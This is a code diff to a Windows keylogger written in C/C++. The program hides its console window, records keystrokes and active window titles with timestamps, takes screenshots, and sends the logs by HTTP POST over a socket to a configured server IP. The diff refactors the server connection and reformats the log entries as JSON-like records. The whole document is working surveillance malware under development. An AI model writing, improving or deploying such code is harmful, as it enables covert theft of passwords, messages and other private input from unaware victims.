@@ -4,7 +4,6 @@
 #include <process.h>
 #include <stdio.h>
 #include <time.h>
-#include <winsock2.h>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
@@ -25,12 +24,15 @@ std::ofstream OUTPUT_FILE;
 
 extern char lastwindow[256];
 
-int ServerConnect(SOCKET &sockfd);
+SOCKET sockfd;
+struct sockaddr_in address;
+struct hostent *website;
+
+int ServerConnect();
 char KeyMapping(char key);
 void ServerMessage(void *p);
 void ScreenShot(char *BmpName);
 void imgTransfer(char *filepath);
-SOCKET sockfd;
 char message[BUFFERSIZE] = {0};
 
 const char *pHttpPost =
@@ -104,7 +106,7 @@ void SendHTTP(const char *msg)
     printf("%s\n", strHttpPost);
     // printf("true length: %d\n", strlen(strHttpPost));
 
-    ServerConnect(sockfd);
+    ServerConnect();
     send(sockfd, strHttpPost, strlen(strHttpPost), 0);
     // send(sockfd, pHttpPost, strlen(pHttpPost), 0);
 }
@@ -133,23 +135,18 @@ int Save(int key_stroke)
             strcpy(lastwindow, window_title);
 
             // get time
-            time_t t = time(NULL);
-            struct tm *tm = localtime(&t);
-            char s[64];
-            strftime(s, sizeof(s), "%c", tm);
+            char s[15];
+            sprintf(s, "%lld", time(NULL));
 
-
-            strcat(message, "[Window: ");
-            strcat(message, window_title);
-            strcat(message, " - at ");
-            // strcat(message, "window_title  ");
-            strcat(message, s);
-            strcat(message, "]\n\n");
+            char tmp[256 + 15 + 30];
+            sprintf(tmp, "\n\n{\"window\": \"%s\", \"time\": %s}\n\n",
+                    window_title, s);
+            strcat(message, tmp);
         }
     }
 
 
-    std::cout << key_stroke << '\n';
+    // std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK) {
         strcat(message, "[#B]");
@@ -265,29 +262,34 @@ void Stealth()
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);  // invisible window
 #endif                                                       // invisible
 }
-
-int ServerConnect(SOCKET &sockfd)
+// void SetConnect()
+int ServerConnect()
 {
-    int result;
-    struct sockaddr_in address;
-    int len;
     WSADATA wsadata;
-
-    address.sin_family = AF_INET;
-    address.sin_addr.s_addr = inet_addr(SERVER_IP);
-    address.sin_port = htons(PORT);
-    len = sizeof(address);
+    int result;
+    int len;
 
     if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
         printf("Winsock Error\n");
         exit(1);
     }
 
+
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    // website = gethostbyname("http://localhost:8081");
+
+    address.sin_family = AF_INET;
+    // address.sin_addr.s_addr = *((unsigned long *) website->h_addr);
+    address.sin_addr.s_addr = inet_addr(SERVER_IP);
+    address.sin_port = htons(PORT);
+
+    len = sizeof(address);
+
 
     result = connect(sockfd, (struct sockaddr *) &address, len);
     if (result == -1) {
-        printf("Connect Error");
+        printf("Connect Error\n");
         return -1;
     } else {
         return 0;
@@ -388,11 +390,6 @@ int main()
 
     // visibility of window
     Stealth();
-
-    // Connect to server
-    /*if (ServerConnect(sockfd) < 0) {
-        exit(1);
-    }*/
 
     // Get message from Server
     _beginthread(ServerMessage, 0, NULL);
